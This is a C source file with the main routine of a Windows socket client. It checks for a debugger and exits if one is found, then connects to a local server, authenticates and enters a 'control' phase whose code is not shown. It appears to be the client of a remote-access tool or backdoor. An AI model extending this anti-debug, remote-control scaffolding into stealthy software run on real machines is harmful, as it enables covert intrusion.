#include <winsock2.h>
#include <windows.h>
#include <ws2tcpip.h>
#include <stdio.h>
#include "util.h"
#include "Authentication.h"
#include "Control.h"

#define SERVER_IP "127.0.0.1"
#define SERVER_PORT "12346"

int main()
{
	// Initialize Winsock
	WSADATA wsaData;
    if (WSAStartup(MAKEWORD(2,2), &wsaData) != 0)
	{
        printf("WSAStartup failed with error: %d\n", (int)GetLastError());
        goto exit;
    }
	char key[MAX_KEY_LEN + 1];
	SOCKET connectSock = INVALID_SOCKET;

	BOOL isdebug = AntiDebug();
	if (isdebug)
		goto exit;
	BOOL success;
    success = Connect(&connectSock,SERVER_IP,SERVER_PORT);
	if(!success)
	{
		puts("Connect fails");
		goto exit;
	}
	puts("Connect OK");

	success = Authentication(&connectSock, key);
	if(!success)
	{
		puts("Authentication fails");
		goto exit;
	}

	puts("Authentication OK!");
	
	success = Control(&connectSock,key);
	if(!success)
	{
		puts("Fail from control phase");
		goto exit;
	}
exit:
	if(connectSock != INVALID_SOCKET)
		closesocket(connectSock);
	// Cleanup Winsock
	WSACleanup();
	system("pause");
}